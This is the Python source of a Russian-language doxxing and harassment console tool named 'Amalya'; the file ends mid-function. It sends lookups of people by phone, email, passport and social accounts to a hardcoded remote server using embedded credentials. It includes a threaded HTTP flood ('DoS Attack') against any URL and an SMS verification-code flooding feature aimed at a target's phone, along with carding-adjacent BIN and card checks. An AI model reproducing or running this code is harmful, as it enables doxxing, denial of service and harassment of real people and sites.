auth = ("rg3u13", "1dayKey_Wasted")
#привет всем кто смог декоднуть! красавчики люти уф сигма бой!!
import smtplib, threading, fake_useragent, string, random, webbrowser, requests, time, os, socket 
from faker import Faker
from email.mime.text import MIMEText
from pystyle import Colorate, Colors, Center, Write
import phonenumbers
from typing import Dict, Any, Optional
from phonenumbers import geocoder, carrier, timezone
from colorama import Fore, Style
from bs4 import BeautifulSoup
import json
import re
from urllib.parse import urlparse

a=input("Введи текстовый пароль для запуска программы:")
if a!="Амалия":
	print(colored(f"Пароль не верен! иди нахуй! ", 'red'))
	print(colored(f"Уточни его у создателя", 'red'))
	exit()

fake = Faker('ru_RU')

start_time = time.time()
function_count = 0
current_language = "ru"
current_theme = "white_to_black"
settings_file = "wasted_settings.json"

# Load settings
def load_settings():
    global current_theme, current_language
    if os.path.exists(settings_file):
        with open(settings_file, 'r', encoding='utf-8') as f:
            settings = json.load(f)
            current_theme = settings.get("theme", "red_to_yellow")
            current_language = settings.get("language", "ru")

# Save settings
def save_settings():
    settings = {"theme": current_theme, "language": current_language}
    with open(settings_file, 'w', encoding='utf-8') as f:
        json.dump(settings, f)

load_settings()

# Open Telegram links on startup

def open_telegram_links():
    try:
        webbrowser.open("https://t.me/adapetamaly", new=2)  # new=2 -> open in a new tab, if possible
        webbrowser.open("https://t.me/+SomlRV-0sr0wNTEy", new=2)
    except Exception:
        pass

open_telegram_links()

THEMES = {
    "green_to_cyan": Colors.green_to_cyan,
    "red_to_yellow": Colors.red_to_yellow,
    "blue_to_purple": Colors.blue_to_purple,
    "purple_to_blue": Colors.purple_to_blue,
    "yellow_to_red": Colors.yellow_to_red,
    "white_to_black": Colors.white_to_black,
    "red": "\033[38;5;196m",    
    "green": "\033[38;5;46m",   
    "blue": "\033[38;5;21m",      
    "purple": "\033[38;5;129m",   
    "cyan": "\033[38;5;51m",       
    "yellow": "\033[38;5;226m",  
    "white": "\033[38;5;255m",    
}

COLOR_CODE = { 
    "RESET": "\033[0m",
    "UNDERLINE": "\033[04m",
    "GREEN": "\033[32m",
    "YELLOW": "\033[93m",
    "RED": "\033[31m",
    "CYAN": "\033[36m",
    "BOLD": "\033[01m",
    "PINK": "\033[95m",
    "URL_L": "\033[36m",
    "LI_G": "\033[92m",
    "F_CL": "\033[0m",
    "DARK": "\033[90m",
    "BLUE": "\033[1;34m",
}

# Language dictionaries
LANGUAGES = {
    "ru": {
        "banner": '''
╔════════════════════════════════════════════════════════════════════════════╗
║                        █ A M A L Y A  —  OSINT  TOOL                       ║
║                                                                            ║
║   lelele ya Amalya                  (adapter : https://t.me/adapetamaly)   ║
║                                                                            ║
╠════════════════════════════════════════════════════════════════════════════╣
║                                 [ SEARCH ]                                 ║
║  1)  Поиск по Email       2)  ФИО + ДР           3)  Поиск по Телефону     ║
║  4)  Поиск по паролю      5)  Поиск по Telegram   6)  Поиск по Facebook     ║
║  7)  Поиск по VK          8)  Поиск по Instagram  9)  Автомобиль (VIN)      ║
║ 10)  Поиск по IP         11)  Поиск по паспорту  12)  Универсальный поиск   ║
║ 13)  OSINT по юзеру      14)  Поиск по VK ID     15)  Sherlock по телефону  ║
╠════════════════════════════════════════════════════════════════════════════╣
║                              [ TOOLS / UTILITIES ]                          ║
║ 16)  Анализ ссылки        17)  Чек на логгер      18)  Проверка BIN         ║
║ 19)  Проверка карты       20)  Мануалы / Гайды                              ║
╠════════════════════════════════════════════════════════════════════════════╣
║                                [ NETWORK / PHONE ]                          ║
║ 23)  HLR-запрос (этичн.)  24)  Порт-сканер (локально)  25)  Инфо по MAC     ║
║                                                                             ║
╠════════════════════════════════════════════════════════════════════════════╣
║                               [ SETTINGS & INFO ]                           ║
║ 26)  Сменить тему         27)  Сменить язык       28)  About software       ║
║ 29)  Время сессии         30)  Discord-пробив                               ║
║ 31)  Флуд/Фейк-коды        21) DoS Attack)                                  ║
║ 32)  Выход                                                                  ║
╚════════════════════════════════════════════════════════════════════════════╝


''',
        "splash": '''
                      ⡠⠒⠉⠉⠉⠉⠒⢄
⠀⠀⠀⠀⠀⠀⠀⡎⠀⠀⠀⠀⠀⠀⠀⠀⢣
⠀⠀⠀⠀⠀⠀⣸⠀⣸⣷⠀⣼⣷⣄⠀⠀⠀⡇
⠀⠀⠀⠀⠀⠀⡇⣆⢿⣿⣷⣿⣿⣿⠀⣄⠀⡇
⠀⠀⠀⠀⠀⠀⢣⢹⣿⣿⣿⣿⣿⡿⣸⠿⠀⡇
⠀⠀⠀⠀⠀⠀ ⡇ ⢻⣿⣿⣿⣿⣿⡿⠁⠀⡇
⠀⠀⠀⠀⠀⠀ ⡇⠀ ⣿⣿⣿⣿⠀⠀ ⠀⢧
⠀⠀⠀⠀⠀⣠⣾⣶⢋⣾⣿⣿⣿⡇⣿⣿⣷⣼⡀
⠀⠀⠀ ⠀⡿⣋⣴⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⡇
⠀ ⠀ ⣠⢾⣿⣿⣿⡯⣿⣿⣿⣿⡟ ⢹⣿⣿⣿⣿         обзьязательно!
⠀⠀ ⡇ ⠀ ⠀⠉⠉⡎⠉⠉⠉ ⠀⠀ ⣿⣿⣿⣿
⠀⠀ ⢧ ⠀ ⠀⠀ ⢧⠀ ⠀⠀ ⠀ ⣸⣿⣿⣿⡇             https://t.me/adapetamaly
⠀⠀⠀ ⠉⡗⠒⠒⠉ ⠑⠤⠤⠤⠒⡏ ⢻⣿⣿⡇                 
⠀⠀ ⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀ ⡇⠀ ⣿⣿⣿                       переходим!
⠀⠀ ⠀⠀ ⢱⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀ ⣿⣿⣿
⠀⠀⠀ ⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠢⡀⢿⣿⣿
⠀ ⠀⠀⠀⠀ ⢱⠀⠀⠀⠀⠀⠀⠀ ⠀⣾⣿⣝⢿
⠀⠀ ⠀ ⠀ ⠀ ⣿⡀⠀⠀⠀⠀⠀ ⣸⣿⣿⣿⣿⡀
⠀⠀ ⠀ ⠀⠀ ⣿⣿⣧ ⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⠀⠀⠀ ⠀ ⣼⣿⣿⣿⡄⠀⠀ ⣿⣿⣿⣿⣿⣿⣿
⠀⠀ ⠀⠀ ⣿⣿⣿⣿⣿⡄⠀⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀ ⠀ ⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⠇
⠀ ⠀  ⠀ ⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⡿⠁
''',
        "login_prompt": "Логин: ",
        "password_prompt": "Пароль: ",
        "login_success": "Вход выполнен успешно!",
        "login_fail": "Неверный логин или пароль. Попробуйте снова.\nЕсли у вас нет логина и пароля или он недействительный, напишите в Telegram @cluim",
        "select_function": "├ [+] Выберите функцию: →",
        "session_stats": "└ Статистика сессии:",
        "functions_count": "  ├ Выполнено функций: ",
        "session_time": "  └ Время работы: ",
        "about_software": "└ Информация о софте:",
        "version": "  ├ Amalya крутой, и это факт.",
        "creator": "  ├ Creator: @cluim",
        "managers": "  ├ adapter: https://t.me/adapetamaly",
        "channel": "  └ Channel: https://t.me/+SomlRV-0sr0wNTEy",
        "invalid_choice": "└ Неверный выбор. Попробуйте снова.",
        "change_theme": "[-] Выберите тему:\n",
        "gradient_themes": "-- Градиентные темы --",
        "solid_themes": "-- Одноцветные темы --",
        "theme_changed": "[+] Тема изменена на ",
        "invalid_theme": "└ Неверный номер темы. Попробуйте снова.",
        "invalid_input": "└ Неверный ввод. Введите число.",
        "change_language": "[-] Выберите язык:\n[1] Русский\n[2] Английский\n└ Введите номер языка: ",
        "language_changed": "[+] Язык изменен на ",
        "press_enter": "└ Нажмите Enter для продолжения ",
        "press_enter_menu": "└ Нажмите Enter для чтобы вернуться в меню",
        "visualizing": "Визуализация связей:",
        "exit_prompt": "└ Вы уверены, что хотите выйти? (y/n): ",
        "search_in_progress": "└ Поиск выполняется, пожалуйста, подождите...",
        "no_results": "└ Результаты не найдены для данного запроса."
    },
    "en": {
        "banner": '''
╔════════════════════════════════════════════════════════════════════════════╗
║                        █ A M A L Y A  —  TOOL                              ║
║                                                                            ║
║   lelele ya Amalya                  (telegram: https://t.me/adapetamaly)   ║
║                                                                            ║
╠════════════════════════════════════════════════════════════════════════════╣
║                                 [ SEARCH ]                                 ║
║  1)  Поиск по Email       2)  ФИО + ДР           3)  Поиск по Телефону     ║
║  4)  Поиск по паролю      5)  Поиск по Telegram   6)  Поиск по Facebook     ║
║  7)  Поиск по VK          8)  Поиск по Instagram  9)  Автомобиль (VIN)      ║
║ 10)  Поиск по IP         11)  Поиск по паспорту  12)  Универсальный поиск   ║
║ 13)  OSINT по юзеру      14)  Поиск по VK ID     15)  Sherlock по телефону  ║
╠════════════════════════════════════════════════════════════════════════════╣
║                              [ TOOLS / UTILITIES ]                          ║
║ 16)  Анализ ссылки        17)  Чек на логгер      18)  Проверка BIN         ║
║ 19)  Проверка карты       20)  Мануалы / Гайды                              ║
╠════════════════════════════════════════════════════════════════════════════╣
║                                [ NETWORK / PHONE ]                          ║
║ 23)  HLR-запрос (этичн.)  24)  Порт-сканер (локально)  25)  Инфо по MAC     ║
║                                                                             ║
╠════════════════════════════════════════════════════════════════════════════╣
║                               [ SETTINGS & INFO ]                           ║
║ 26)  Сменить тему         27)  Сменить язык       28)  About software       ║
║ 29)  Время сессии         30)  Discord-пробив                               ║
║ 31)  Флуд/Фейк-коды        21) DoS Attack)                                  ║
║ 32)  Выход                                                                  ║
╚════════════════════════════════════════════════════════════════════════════╝
''',
        "splash": '''
                      ⡠⠒⠉⠉⠉⠉⠒⢄
⠀⠀⠀⠀⠀⠀⠀⡎⠀⠀⠀⠀⠀⠀⠀⠀⢣
⠀⠀⠀⠀⠀⠀⣸⠀⣸⣷⠀⣼⣷⣄⠀⠀⠀⡇
⠀⠀⠀⠀⠀⠀⡇⣆⢿⣿⣷⣿⣿⣿⠀⣄⠀⡇
⠀⠀⠀⠀⠀⠀⢣⢹⣿⣿⣿⣿⣿⡿⣸⠿⠀⡇
⠀⠀⠀⠀⠀⠀ ⡇ ⢻⣿⣿⣿⣿⣿⡿⠁⠀⡇
⠀⠀⠀⠀⠀⠀ ⡇⠀ ⣿⣿⣿⣿⠀⠀ ⠀⢧
⠀⠀⠀⠀⠀⣠⣾⣶⢋⣾⣿⣿⣿⡇⣿⣿⣷⣼⡀
⠀⠀⠀ ⠀⡿⣋⣴⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⡇
⠀ ⠀ ⣠⢾⣿⣿⣿⡯⣿⣿⣿⣿⡟ ⢹⣿⣿⣿⣿
⠀⠀ ⡇ ⠀ ⠀⠉⠉⡎⠉⠉⠉ ⠀⠀ ⣿⣿⣿⣿
⠀⠀ ⢧ ⠀ ⠀⠀ ⢧⠀ ⠀⠀ ⠀ ⣸⣿⣿⣿⡇
⠀⠀⠀ ⠉⡗⠒⠒⠉ ⠑⠤⠤⠤⠒⡏ ⢻⣿⣿⡇
⠀⠀ ⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀ ⡇⠀ ⣿⣿⣿
⠀⠀ ⠀⠀ ⢱⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀ ⣿⣿⣿
⠀⠀⠀ ⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠢⡀⢿⣿⣿
⠀ ⠀⠀⠀⠀ ⢱⠀⠀⠀⠀⠀⠀⠀ ⠀⣾⣿⣝⢿
⠀⠀ ⠀ ⠀ ⠀ ⣿⡀⠀⠀⠀⠀⠀ ⣸⣿⣿⣿⣿⡀
⠀⠀ ⠀ ⠀⠀ ⣿⣿⣧ ⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⠀⠀⠀ ⠀ ⣼⣿⣿⣿⡄⠀⠀ ⣿⣿⣿⣿⣿⣿⣿
⠀⠀ ⠀⠀ ⣿⣿⣿⣿⣿⡄⠀⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀ ⠀ ⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⠇
⠀ ⠀  ⠀ ⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⡿⠁
''',
        "login_prompt": "Login: ",
        "password_prompt": "Password: ",
        "login_success": "Login successful!",
        "login_fail": "Invalid login or password. Try again.\nIf you don't have a login or password or it's invalid, contact @ElusiveW3b on Telegram",
        "select_function": "├ [+] Select function: →",
        "session_stats": "└ Session stats:",
        "functions_count": "  ├ Functions executed: ",
        "session_time": "  └ Session time: ",
        "about_software": "└ Software info:",
        "version": "  ├ Amalya крутой, и это факт.",
        "creator": "  ├ Creator: @cluim",
        "managers": "  ├ adapter: https://t.me/adapetamaly",
        "channel": "  └ Channel: https://t.me/+SomlRV-0sr0wNTEy",
        "invalid_choice": "└ Invalid choice. Please try again.",
        "change_theme": "[-] Select theme:\n",
        "gradient_themes": "-- Gradient themes --",
        "solid_themes": "-- Solid themes --",
        "theme_changed": "[+] Theme changed to ",
        "invalid_theme": "└ Invalid theme number. Try again.",
        "invalid_input": "└ Invalid input. Enter a number.",
        "change_language": "[-] Select language:\n[1] Russian\n[2] English\n└ Enter language number: ",
        "language_changed": "[+] Language changed to ",
        "press_enter": "└ Press Enter to continue ",
        "press_enter_menu": "└ Press Enter to return to menu",
        "visualizing": "Visualizing connections:",
        "exit_prompt": "└ Are you sure you want to exit? (y/n): ",
        "search_in_progress": "└ Search in progress, please wait...",
        "no_results": "└ No results found for this query."
    }
}

# Input prompts in Russian (always)
INPUT_PROMPTS = {
    "input_email": "└ Введите почту → ",
    "input_name_dob": "└ Введите ФИО и ДР → ",
    "input_phone": "└ Введите номер → ",
    "input_password": "└ Введите пароль → ",
    "input_query": "└ Введите запрос → ",
    "input_facebook": "└ Введите Facebook → ",
    "input_vk": "└ Введите VKontakte → ",
    "input_instagram": "└ Введите Instagram → ",
    "input_vehicle": "└ Введите номер автомобиля → ",
    "input_ip": "├ Введите IP → ",
    "input_dos_link": "└ Введите ссылку для DDoS атаки → ",
    "input_phone_links": "├ Введите номер телефона (например, 79129666777) → ",
    "input_username": "├ Введите username для поиска: ",
    "input_user_id": "└ Введите ID пользователя: ",
    "input_card": "└ Введите карту → ",
    "input_port_scan": "└ Введите IP для сканирования портов → ",
    "input_phone_number": "[+] Введите номер телефона (с +): ",
    "visualize_connections": "└ Введите запрос для визуализации связей → ",
    "input_phone_number_flood": "└ Введите номер телефона для флуд кодами: "
}

banner = LANGUAGES[current_language]["banner"]
splash_text = LANGUAGES[current_language]["splash"]

def find_username(username):  
    Write.Print(LANGUAGES[current_language]["search_in_progress"], THEMES[current_theme])
    data = {"t": username}  
    try:
        response = requests.post("https://85.192.30.30:666/found_profile", json=data, auth=auth)  
    except requests.exceptions.RequestException as e:
        Write.Print(f"\t└ Хуйня! я ниче не нашел..(: {e}", THEMES[current_theme])
        return None
    if response.status_code == 401:  
        return None  

    result = response.json()  
    found_on = result.get("found", [])  

    if found_on == "Не найдено." or not found_on:  
        Write.Print(f"\t└ {LANGUAGES[current_language]['no_results']}", THEMES[current_theme])
    else:  
        Write.Print(f"Юзер '{username}' найден на:", THEMES[current_theme])
        for platform, url in found_on:  
            Write.Print(f"- {platform}: {url}", Colors.white)
    return result

def cls():
    input(f'\n\t{COLOR_CODE["RESET"]}{COLOR_CODE["BOLD"]}{LANGUAGES[current_language]["press_enter"]}')
    os.system('cls' if os.name == 'nt' else 'clear')

def show_splash():
    if "_to_" in current_theme:  
        print(Colorate.Horizontal(THEMES[current_theme], Center.XCenter(splash_text)))
    else:  
        print(Center.XCenter(Colorate.Color(THEMES[current_theme], splash_text)))
    input(f'\n\t{COLOR_CODE["RESET"]}{COLOR_CODE["BOLD"]}{LANGUAGES[current_language]["press_enter"]}')

def TGSearch(Term):
    def mmake_request(Term):
        data = {"t": str(Term)}
        try:
            response = requests.post("http://85.192.30.30:666/tgs", json=data, auth=auth, timeout=60)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            Write.Print(f"\t└ Ошибка при выполнении запроса, иди нахуй..): {e}", THEMES[current_theme])
            return {"result": []}
    
    Write.Print(LANGUAGES[current_language]["search_in_progress"], THEMES[current_theme])
    data = mmake_request(Term)
    
    if not data.get("result"):
        Write.Print(f"\t└ {LANGUAGES[current_language]['no_results']}", THEMES[current_theme])
        return None
    
    Write.Print("\n\t└──│ Найденные данные:\n", THEMES[current_theme], interval=0.001)
    
    for item in data["result"]:
        if isinstance(item, str) and item == "Не найдено.":
            Write.Print(f"\t├─── {LANGUAGES[current_language]['no_results']}", THEMES[current_theme])
            return None  
        
        if isinstance(item, dict):
            for key, value in item.items():
                Write.Print(f"\t│ ├ {key} -> ", THEMES[current_theme], interval=0.001)
                Write.Print(f"{value}\n", Colors.white, interval=0.001)
    
    print()
    Write.Print("----======[", THEMES[current_theme], interval=0.005)
    Write.Print("@ElusiveW3b", Colors.white, interval=0.005)
    Write.Print("======----", THEMES[current_theme], interval=0.005)
    return data

def Search(Term):
    def make_request(Term):
        data = {"t": str(Term)}
        try:
            response = requests.post("http://85.192.30.30:666/sed", json=data, auth=auth, timeout=60)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            Write.Print(f"\t└ Ошибка при выполнении запроса, пошел нахуй..): {e}", THEMES[current_theme])
            return {"result": []}
    
    Write.Print(LANGUAGES[current_language]["search_in_progress"], THEMES[current_theme])
    data = make_request(Term)
    if data.get("result"):
        silka = data["result"]
        Write.Print(f"\n\t└──│ Сайт с отчетом (ссылка работает 24 часа) ибо иди нахуй: {silka}", THEMES[current_theme], interval=0.001)
    else:
        Write.Print(f"\t└ {LANGUAGES[current_language]['no_results']}", THEMES[current_theme])
        print()
        Write.Print("----======[", THEMES[current_theme], interval=0.005)
        Write.Print("@ElusiveW3b", Colors.white, interval=0.005)
        Write.Print("======----", THEMES[current_theme], interval=0.005)
        return None
    
    print()
    Write.Print("----======[", THEMES[current_theme], interval=0.005)
    Write.Print("@ElusiveW3b", Colors.white, interval=0.005)
    Write.Print("======----", THEMES[current_theme], interval=0.005)
    return data

class DiscordTrackerScraper:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8",
        })
        self.base_url = "https://discord-sensor.com"
        self.request_delay = 1  # Задержка между запросами в секундах, ибо тебя ебать не должно.

    def safe_request(self, url: str) -> Optional[requests.Response]:
        time.sleep(self.request_delay)
        try:
            response = self.session.get(url, timeout=20)
            response.raise_for_status()
            return response
        except requests.exceptions.HTTPError as e:
            print(f"Ошибка: Не удалось загрузить страницу ({e.response.status_code})")
        except requests.exceptions.RequestException as e:
            print(f"Ошибка запроса: {e}")
        return None

    def open_user_profile(self, user_id: str) -> bool:
        """Делает запрос к странице профиля и открывает ее в браузере."""
        profile_url = f"{self.base_url}/members/{user_id}"
        response = self.safe_request(profile_url)
        if response:
            print(f"Открываем страницу: {profile_url}")
            webbrowser.open(profile_url)
            return True
        else:
            print(f"Не удалось открыть страницу для user_id: {user_id}")
            return False

def discord_osint_tool():
    """Функция для поиска по Discord User ID."""
    scraper = DiscordTrackerScraper()
    
    print("\n--- Discord OSINT ---")
    user_id = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_user_id"]}{COLOR_CODE["RESET"]} ')
    
    if not user_id.isdigit():
        print("⚠️ ЕБЛАН Discord User ID должен быть числом!")
        input(f'\n{COLOR_CODE["RED"]}{LANGUAGES[current_language]["press_enter_menu"]}{COLOR_CODE["RESET"]}')
        return

    start_time = time.time()
    scraper.open_user_profile(user_id)
    elapsed_time = time.time() - start_time
    
    print(f"\nЗапрос выполнен за {elapsed_time:.2f} секунд")
    input(f'\n{COLOR_CODE["RED"]}{LANGUAGES[current_language]["press_enter_menu"]}{COLOR_CODE["RESET"]}')

def check_logger_link():
    url = input("\tВведите ссылку для проверки на логгер → ")
    print("\n[+] Проверка на логгер:")

    suspicious_keywords = [
        "grab", "logger", "api/webhooks", "steal", "token", "auth", "discord.com/api/webhooks",
        "webhook.site", "send.php", "formsubmit", "collect", "php?data=", "track.php"
    ]

    if not url.startswith("http"):
        url = "http://" + url

    is_suspicious = any(keyword.lower() in url.lower() for keyword in suspicious_keywords)

    try:
        response = requests.get(url, timeout=5)
        content = response.text.lower()
        if any(kw in content for kw in suspicious_keywords):
            is_suspicious = True
    except requests.exceptions.RequestException:
        pass

    print(f"  └ Вердикт: {'⚠ Найдены признаки логгера, нельзя по нему переходить!' if is_suspicious else ' Безопасно (предположительно)'}")
    input("\nНажмите Enter, чтобы продолжить...")

def analyze_link():
    url = input("\tВведите ссылку для анализа → ")
    print("\n[+] Анализ ссылки:")

    if not url.startswith("http"):
        url = "http://" + url

    parsed = urlparse(url)
    print(f"  ├ Схема: {parsed.scheme}")
    print(f"  ├ Домен: {parsed.netloc}")
    print(f"  ├ Путь: {parsed.path if parsed.path else 'Нет'}")
    print(f"  ├ Параметры: {parsed.params if parsed.params else 'Нет'}")
    print(f"  ├ Запрос: {parsed.query if parsed.query else 'Нет'}")
    print(f"  ├ Якорь: {parsed.fragment if parsed.fragment else 'Нет'}")

    try:
        response = requests.head(url, allow_redirects=True, timeout=5)
        print(f"  ├ Статус: {response.status_code}")
        print(f"  ├ Перенаправление: {response.url if response.url != url else 'Нет'}")
        print("  └ Заголовки:")
        for k, v in response.headers.items():
            print(f"     └ {k}: {v}")
    except requests.exceptions.RequestException as e:
        print(f"  [!] Ошибка при попытке запроса: {e}")

    input("\nНажмите Enter, чтобы продолжить...")

def get_mac_info():
    print("Введите MAC-адрес (пример: 00:1A:2B:3C:4D:5E):")
    mac_address = input().strip()
    if not mac_address or len(mac_address.split(':')) != 6:
        return "Ошибка: Неверный формат MAC-адреса."
    
    try:
        url = f"https://api.macvendors.com/{mac_address}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return f"Производитель: {response.text}"
        else:
            return "Производитель не найден."
    except requests.RequestException as e:
        return f"Ошибка при запросе: {e}"

def tgss(id):
    data = {"t": str(id)}
    res = requests.post("http://85.192.30.30:666/tgss", json=data, auth=auth)
    if res.status_code == 200:
        r = res.json()
        if r["result"] == "WCIP":
            print("Введи айди или юзернейм")
        else:
            print(r["result"])
        return r
    else:
        print("Что-то пошло не так.")
        return None

def dos_attack():
    link = input(f'\t{COLOR_CODE["RESET"]}{COLOR_CODE["BOLD"]}{INPUT_PROMPTS["input_dos_link"]}{COLOR_CODE["DARK"]}{COLOR_CODE["BOLD"]}→{COLOR_CODE["RESET"]} ')
    
    def dos():
        for _ in range(10): 
            try:
                requests.get(link)
            except requests.exceptions.RequestException:
                pass

    for _ in range(10):
        threading.Thread(target=dos).start()

def code_flood():
    number = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{INPUT_PROMPTS["input_phone_number_flood"]}{COLOR_CODE["RESET"]} ')
    try:
        number = int(number)  # Проверяем, что введено число
    except ValueError:
        Write.Print(f"\t└ Ошибка: Введите корректный номер телефона (только цифры).", THEMES[current_theme])
        return
    data = {"t": str(number)}
    try: 
        resp = requests.post("http://85.192.30.30:666/scd", json=data, auth=auth)  
    except requests.exceptions.RequestException as e:
        Write.Print(f"\t└ Ошибка при выполнении запроса: {e}", THEMES[current_theme])
        return
    dildo = resp.json()      
    if dildo.get('status') == "success":                
        Write.Print(f"\t└ Коды успешно отправлены.", THEMES[current_theme])
    else:
        Write.Print(f"\t└ Ошибка при отправке кодов.", THEMES[current_theme])

def bin_checker():
    bin_input = input("\tВведите BIN (первые 6 цифр карты) → ").strip()
    if not re.match(r"^\d{6}$", bin_input):
        print("[!] Неверный формат. Нужно 6 цифр.")
        return

    print("\n[+] Проверка BIN:")
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_input}")
        if response.status_code == 200:
            data = response.json()
            print(f"  ├ Банк: {data.get('bank', {}).get('name', 'Неизвестно')}")
            print(f"  ├ Страна: {data.get('country', {}).get('name', 'Неизвестно')} ({data.get('country', {}).get('alpha2', '')})")
            print(f"  ├ Тип: {data.get('type', 'Неизвестно')}")
            print(f"  ├ Бренд: {data.get('brand', 'Неизвестно')}")
            print(f"  └ Валюта: {data.get('country', {}).get('currency', 'Неизвестно')}")
        else:
            print(f"[!] BIN не найден в базе.")
    except Exception as e:
        print(f"[!] Ошибка: {e}")
    input("\nНажмите Enter, чтобы продолжить...")

def validate_card_number():
    card = input("\tВведите номер карты для проверки → ").replace(" ", "").strip()
    if not card.isdigit():
        print("[!] Номер должен содержать только цифры.")
        return

    def luhn_checksum(card_number):
        digits = [int(d) for d in card_number]
        checksum = 0
        is_even = False
        for d in reversed(digits):
            if is_even:
                d *= 2
                if d > 9:
                    d -= 9
            checksum += d
            is_even = not is_even
        return checksum % 10 == 0

    if luhn_checksum(card):
        print("✅ Карта выглядит валидной (Luhn пройдён)")
    else:
        print("❌ Неверный номер карты (не прошёл Luhn)")

    input("\nНажмите Enter, чтобы продолжить...")

def show_session_stats():
    global function_count
    elapsed_time = time.time() - start_time
    hours, rem = divmod(elapsed_time, 3600)
    minutes, seconds = divmod(rem, 60)
    time_str = f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
    print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{LANGUAGES[current_language]["session_stats"]}{COLOR_CODE["RESET"]}')
    print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{LANGUAGES[current_language]["functions_count"]}{function_count}{COLOR_CODE["RESET"]}')
    print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}{LANGUAGES[current_language]["session_time"]}{time_str}{COLOR_CODE["RESET"]}')

def sph(id):
    data = {"t": str(id)}
    res = requests.post("http://85.192.30.30:666/sph", json=data, auth=auth)
    if res.status_code == 200:
        r = res.json()
        if r["result"] == "Pizda":
            print("Введи номер телефона.")
        else:
            if "🔍 **Обнаружен идентификатор:**" in r["result"]:
                print("Введи номер телефона.")
            else:
                print(r["result"])
    else:
        print("Что-то пошло не так.")

def scan_ports(ip):
    ports = [80, 443]
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        if sock.connect_ex((ip, port)) == 0:
            print(f"Порт {port} открыт")
        sock.close()

def vk_search(id):
    data = {"t": str(id)}
    res = requests.post("https://85.192.30.30:666/vk", json=data, auth=auth)
    if res.status_code == 200:
        r = res.json()
        if r["result"] == "WCIP":
            print("Введи айди")
        else:
            print(r["result"])
        return r
    else:
        print("Что-то пошло не так.")
        return None

def scan_number():
    phone = input(Fore.YELLOW + INPUT_PROMPTS["input_phone_number"] + Style.RESET_ALL)
    return phoneinfo(phone)

def phoneinfo(phone):
    try:
        parsed_phone = phonenumbers.parse(phone, None)
        if not phonenumbers.is_valid_number(parsed_phone):
            print(Fore.RED + "[!] Ошибка: Недействительный номер телефона\n" + Style.RESET_ALL)
            return None
        region = geocoder.description_for_number(parsed_phone, "ru")
        carrier_info = carrier.name_for_number(parsed_phone, "en")
        country = geocoder.country_name_for_number(parsed_phone, "en")
        formatted_number = phonenumbers.format_number(parsed_phone, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
        is_valid = phonenumbers.is_valid_number(parsed_phone)
        is_possible = phonenumbers.is_possible_number(parsed_phone)
        timezones = timezone.time_zones_for_number(parsed_phone)
        number_type = phonenumbers.number_type(parsed_phone)
        type_description = {
            phonenumbers.PhoneNumberType.MOBILE: "Мобильный",
            phonenumbers.PhoneNumberType.FIXED_LINE: "Стационарный",
            phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "Стационарный/Мобильный",
            phonenumbers.PhoneNumberType.VOIP: "VoIP",
            phonenumbers.PhoneNumberType.PREMIUM_RATE: "Премиум",
            phonenumbers.PhoneNumberType.TOLL_FREE: "Бесплатный",
            phonenumbers.PhoneNumberType.UNKNOWN: "Неизвестно"
        }.get(number_type, "Неизвестно")
        print_phone_info = f"""
{Fore.GREEN}[+] Информация о номере:{Style.RESET_ALL}
  [+] Форматированный номер: {formatted_number}
   └[+] Страна: {country if country else 'Не найдено'}
     └[+] Регион: {region if region else 'Не найдено'}
       └[+] Оператор: {carrier_info if carrier_info else 'Не найдено'}
         └[+] Тип номера: {type_description}
           └[+] Активен: {is_possible}
             └[+] Валидность: {is_valid}
               └[+] Часовые пояса: {", ".join(timezones) if timezones else 'Не найдено'}
                 └[@] Ссылки:
    [+] Telegram: https://t.me/{phone}
     └[+] WhatsApp: https://wa.me/{phone}
       └[+] Viber: https://viber.click/{phone}
"""
        print(print_phone_info)
        input(Fore.YELLOW + "[?] Нажмите Enter, чтобы продолжить..." + Style.RESET_ALL)
        return {
            "formatted_number": formatted_number,
            "country": country,
            "region": region,
            "carrier": carrier_info,
            "number_type": type_description,
            "is_possible": is_possible,
            "is_valid": is_valid,
            "timezones": timezones,
            "links": {
                "Telegram": f"https://t.me/{phone}",
                "WhatsApp": f"https://wa.me/{phone}",
                "Viber": f"https://viber.click/{phone}"
            }
        }
    except phonenumbers.phonenumberutil.NumberParseException:
        print(Fore.RED + "[!] Ошибка: Неправильный формат номера телефона\n" + Style.RESET_ALL)
        return None
    except Exception as e:
